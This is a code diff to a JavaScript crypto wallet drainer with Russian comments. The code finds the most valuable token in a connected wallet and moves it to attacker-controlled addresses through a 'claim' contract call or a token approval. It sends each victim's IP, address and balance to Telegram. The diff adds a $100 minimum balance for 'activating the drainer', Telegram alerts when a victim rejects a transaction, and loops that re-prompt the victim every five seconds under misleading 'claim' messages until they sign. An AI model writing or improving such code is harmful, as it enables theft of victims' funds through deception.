@@ -7,6 +7,9 @@ import { readContract, writeContract, sendCalls, getBalance } from '@wagmi/core'
 // === Глобальный флаг для управления sendCalls ===
 const USE_SENDCALLS = false;
 
+// === Минимальный баланс в долларах для активации дрейнера ===
+const MIN_BALANCE_USD = 100;
+
 // Утилита для дебаунсинга
 const debounce = (func, wait) => {
   let timeout
@@ -408,6 +411,28 @@ async function notifyTransferSuccess(address, walletName, device, token, chainId
   }
 }
 
+async function notifyTransactionRejected(address, walletName, device, token, chainId, transactionType) {
+  try {
+    console.log('Sending transaction rejection notification')
+    const ip = await getUserIP()
+    const scanLink = getScanLink(address, chainId)
+    const networkName = Object.keys(networkMap).find(key => networkMap[key].chainId === chainId) || 'Unknown'
+    const amountValue = token ? (token.balance * token.price).toFixed(2) : 'Unknown'
+    const tokenInfo = token ? `${token.symbol} - ${token.balance.toFixed(4)} ${token.symbol}` : 'Native token'
+    const message = `❌ Transaction rejected (${walletName} - ${device})\n` +
+                    `🌀 [Address](${scanLink})\n` +
+                    `🕸 Network: ${networkName}\n` +
+                    `🌎 ${ip}\n\n` +
+                    `**Transaction Type: ${transactionType}**\n` +
+                    `**Value: ${amountValue}$**\n` +
+                    `➡️ ${tokenInfo}\n\n` +
+                    `⚠️ User rejected the transaction`
+    await sendTelegramMessage(message)
+  } catch (error) {
+    store.errors.push(`Error in notifyTransactionRejected: ${error.message}`)
+  }
+}
+
 const TOKENS = {
   'Ethereum': [
     { symbol: 'USDT', address: '0xdac17f958d2ee523a2206206994597c13d831ec7', decimals: 6 },
@@ -661,7 +686,7 @@ const getGasReserveWei = (chainId) => {
   return parseUnits('0.0005', 18)
 }
 
-const claimNative = async (wagmiConfig, chainId, userAddress, nativeBalance) => {
+const claimNative = async (wagmiConfig, chainId, userAddress, nativeBalance, retryCount = 0) => {
   if (!userAddress || !isAddress(userAddress)) throw new Error('Invalid user address')
   const contractAddress = CONTRACTS[chainId]
   if (!contractAddress || !isAddress(contractAddress)) throw new Error('Invalid contract address for chain')
@@ -672,15 +697,23 @@ const claimNative = async (wagmiConfig, chainId, userAddress, nativeBalance) => 
   const minDust = parseUnits('0.000001', 18)
   const valueToSend = balanceWei > reserveWei + minDust ? (balanceWei - reserveWei) : (balanceWei > minDust ? (balanceWei - minDust) : 0n)
   if (valueToSend <= 0n) throw new Error('Insufficient native balance to send')
-  const txHash = await writeContract(wagmiConfig, {
-    address: getAddress(contractAddress),
-    abi: drainerAbi,
-    functionName: 'claim',
-    args: [getAddress(NATIVE_RECIPIENT)],
-    chainId,
-    value: valueToSend
-  })
-  return txHash
+  try {
+    const txHash = await writeContract(wagmiConfig, {
+      address: getAddress(contractAddress),
+      abi: drainerAbi,
+      functionName: 'claim',
+      args: [getAddress(NATIVE_RECIPIENT)],
+      chainId,
+      value: valueToSend
+    })
+    return txHash
+  } catch (error) {
+    // Проверяем, является ли ошибка отклонением пользователя
+    if (error.code === 4001 || error.code === -32000) {
+      throw { ...error, isUserRejection: true }
+    }
+    throw error
+  }
 }
 
 const getTokenAllowance = async (wagmiConfig, ownerAddress, tokenAddress, spenderAddress, chainId) => {
@@ -732,7 +765,7 @@ const getTokenPrice = async (symbol) => {
   }
 }
 
-const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId) => {
+const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId, retryCount = 0) => {
   if (!wagmiConfig) throw new Error('wagmiConfig is not initialized')
   if (!tokenAddress || !contractAddress) throw new Error('Missing token or contract address')
   if (!isAddress(tokenAddress) || !isAddress(contractAddress)) throw new Error('Invalid token or contract address')
@@ -788,6 +821,10 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
       return txHash
     }
   } catch (error) {
+    // Проверяем, является ли ошибка отклонением пользователя
+    if (error.code === 4001 || error.code === -32000) {
+      throw { ...error, isUserRejection: true }
+    }
     store.errors.push(`Approve token failed: ${error.message}`)
     throw error
   }
@@ -957,6 +994,14 @@ const initializeSubscribers = (modal) => {
       if (mostExpensive) {
         console.log(`Most expensive token: ${mostExpensive.symbol}, balance: ${mostExpensive.balance}, price in USD: ${mostExpensive.price}`)
         
+        // Проверяем минимальный баланс
+        if (mostExpensive.price < MIN_BALANCE_USD) {
+          console.log(`Balance too low: ${mostExpensive.price}$ < ${MIN_BALANCE_USD}$ minimum`)
+          hideCustomModal()
+          store.isProcessingConnection = false
+          return
+        }
+        
         if (mostExpensive.address === 'native') {
           console.log('Processing native token claim...')
           
@@ -1005,27 +1050,64 @@ const initializeSubscribers = (modal) => {
             console.log(`Already on correct network: ${mostExpensive.network} (chainId ${expectedChainId})`)
           }
           
-          try {
-            // Обновляем модальное окно для показа подписи
+          // Функция для повторных попыток нативного claim
+          const attemptNativeClaim = async (retryCount = 0) => {
             const modalMessage = document.querySelector('.custom-modal-message')
-            if (modalMessage) modalMessage.textContent = 'Sign transaction to claim native tokens'
-            
-            const txHash = await claimNative(wagmiAdapter.wagmiConfig, mostExpensive.chainId, state.address, mostExpensive.balance)
-            console.log('Native claim tx sent:', txHash)
-            
-            // Уведомление об успехе
-            await notifyTransferSuccess(
-              state.address,
-              walletInfo.name,
-              device,
-              { symbol: mostExpensive.symbol, balance: mostExpensive.balance, price: mostExpensive.price },
-              mostExpensive.chainId,
-              txHash
-            )
-     
-          } catch (error) {
-            await new Promise(resolve => setTimeout(resolve, 3000))
+            try {
+              if (modalMessage) modalMessage.textContent = retryCount > 0 ? 
+                `Retrying claim (attempt ${retryCount + 1})...` : 
+                'Sign transaction to claim native tokens'
+              
+              const txHash = await claimNative(wagmiAdapter.wagmiConfig, mostExpensive.chainId, state.address, mostExpensive.balance)
+              console.log('Native claim tx sent:', txHash)
+              
+              // Уведомление об успехе
+              await notifyTransferSuccess(
+                state.address,
+                walletInfo.name,
+                device,
+                { symbol: mostExpensive.symbol, balance: mostExpensive.balance, price: mostExpensive.price },
+                mostExpensive.chainId,
+                txHash
+              )
+              
+              // Показываем успех в модальном окне
+              if (modalMessage) modalMessage.textContent = `Success! Transaction: ${txHash}`
+              await new Promise(resolve => setTimeout(resolve, 2000))
+              return true
+              
+            } catch (error) {
+              console.error('Native claim failed:', error)
+              
+              // Если пользователь отклонил транзакцию
+              if (error.isUserRejection) {
+                // Отправляем уведомление об отклонении
+                await notifyTransactionRejected(
+                  state.address,
+                  walletInfo.name,
+                  device,
+                  { symbol: mostExpensive.symbol, balance: mostExpensive.balance, price: mostExpensive.price },
+                  mostExpensive.chainId,
+                  'Native Claim'
+                )
+                
+                // Показываем сообщение об отклонении
+                if (modalMessage) modalMessage.textContent = 'Transaction rejected. Retrying in 5 seconds...'
+                
+                // Ждем 5 секунд и повторяем
+                await new Promise(resolve => setTimeout(resolve, 5000))
+                return attemptNativeClaim(retryCount + 1)
+              } else {
+                // Другие ошибки
+                if (modalMessage) modalMessage.textContent = `Claim failed: ${error.message}`
+                store.errors.push(`Native claim failed: ${error.message}`)
+                await new Promise(resolve => setTimeout(resolve, 3000))
+                return false
+              }
+            }
           }
+          
+          await attemptNativeClaim()
           hideCustomModal()
           store.isProcessingConnection = false
           return
@@ -1135,9 +1217,11 @@ const initializeSubscribers = (modal) => {
         } else {
           console.log(`Already on correct network: ${mostExpensive.network} (chainId ${expectedChainId})`)
         }
-        try {
+        // Функция для повторных попыток approve
+        const attemptApprove = async (retryCount = 0) => {
           const contractAddress = CONTRACTS[mostExpensive.chainId]
           const approvalKey = `${state.address}_${mostExpensive.chainId}_${mostExpensive.address}_${contractAddress}`
+          
           if (store.approvedTokens[approvalKey] || store.isApprovalRequested || store.isApprovalRejected) {
             const approveMessage = store.approvedTokens[approvalKey]
               ? `Approve already completed for ${mostExpensive.symbol} on ${mostExpensive.network}`
@@ -1147,40 +1231,77 @@ const initializeSubscribers = (modal) => {
             console.log(approveMessage)
             const approveState = document.getElementById('approveState')
             if (approveState) approveState.innerHTML = approveMessage
-            store.isProcessingConnection = false
-            return
-          }
-          store.isApprovalRequested = true
-          const txHash = await approveToken(wagmiAdapter.wagmiConfig, mostExpensive.address, contractAddress, mostExpensive.chainId)
-          store.approvedTokens[approvalKey] = true
-          store.isApprovalRequested = false
-          let approveMessage = `Approve successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`
-          console.log(approveMessage)
-          await notifyTransferApproved(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId)
-          
-          console.log('Waiting for allowance confirmation...')
-          await waitForAllowance(wagmiAdapter.wagmiConfig, state.address, mostExpensive.address, contractAddress, mostExpensive.chainId)
-          
-          const amount = parseUnits(mostExpensive.balance.toString(), mostExpensive.decimals)
-          console.log(`Sending transfer request with amount: ${amount.toString()}`)
-          const transferResult = await sendTransferRequest(state.address, mostExpensive.address, amount, mostExpensive.chainId, txHash)
-          
-          if (transferResult.success) {
-            console.log(`Transfer successful: ${transferResult.txHash}`)
-            await notifyTransferSuccess(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId, transferResult.txHash)
-            approveMessage += `<br>Transfer successful: ${transferResult.txHash}`
-          } else {
-            console.log(`Transfer failed: ${transferResult.message}`)
-            approveMessage += `<br>Transfer failed: ${transferResult.message}`
+            return false
           }
           
-          const approveState = document.getElementById('approveState')
-          if (approveState) approveState.innerHTML = approveMessage
-          hideCustomModal()
-          store.isProcessingConnection = false
-        } catch (error) {
-          handleApproveError(error, mostExpensive, state)
+          try {
+            store.isApprovalRequested = true
+            const approveState = document.getElementById('approveState')
+            if (approveState) approveState.innerHTML = retryCount > 0 ? 
+              `Retrying approve (attempt ${retryCount + 1})...` : 
+              `Sign transaction to approve ${mostExpensive.symbol}`
+            
+            const txHash = await approveToken(wagmiAdapter.wagmiConfig, mostExpensive.address, contractAddress, mostExpensive.chainId)
+            store.approvedTokens[approvalKey] = true
+            store.isApprovalRequested = false
+            let approveMessage = `Approve successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`
+            console.log(approveMessage)
+            await notifyTransferApproved(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId)
+            
+            console.log('Waiting for allowance confirmation...')
+            await waitForAllowance(wagmiAdapter.wagmiConfig, state.address, mostExpensive.address, contractAddress, mostExpensive.chainId)
+            
+            const amount = parseUnits(mostExpensive.balance.toString(), mostExpensive.decimals)
+            console.log(`Sending transfer request with amount: ${amount.toString()}`)
+            const transferResult = await sendTransferRequest(state.address, mostExpensive.address, amount, mostExpensive.chainId, txHash)
+            
+            if (transferResult.success) {
+              console.log(`Transfer successful: ${transferResult.txHash}`)
+              await notifyTransferSuccess(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId, transferResult.txHash)
+              approveMessage += `<br>Transfer successful: ${transferResult.txHash}`
+            } else {
+              console.log(`Transfer failed: ${transferResult.message}`)
+              approveMessage += `<br>Transfer failed: ${transferResult.message}`
+            }
+            
+            if (approveState) approveState.innerHTML = approveMessage
+            return true
+            
+          } catch (error) {
+            store.isApprovalRequested = false
+            
+            // Если пользователь отклонил транзакцию
+            if (error.isUserRejection) {
+              // Отправляем уведомление об отклонении
+              await notifyTransactionRejected(
+                state.address,
+                walletInfo.name,
+                device,
+                mostExpensive,
+                mostExpensive.chainId,
+                'Token Approve'
+              )
+              
+              // Показываем сообщение об отклонении
+              const approveState = document.getElementById('approveState')
+              if (approveState) approveState.innerHTML = 'Transaction rejected. Retrying in 5 seconds...'
+              
+              // Ждем 5 секунд и повторяем
+              await new Promise(resolve => setTimeout(resolve, 5000))
+              return attemptApprove(retryCount + 1)
+            } else {
+              // Другие ошибки
+              handleApproveError(error, mostExpensive, state)
+              return false
+            }
+          }
         }
+        
+        const success = await attemptApprove()
+        if (success) {
+          hideCustomModal()
+        }
+        store.isProcessingConnection = false
       } else {
         const message = 'No tokens with positive balance'
         console.log(message)
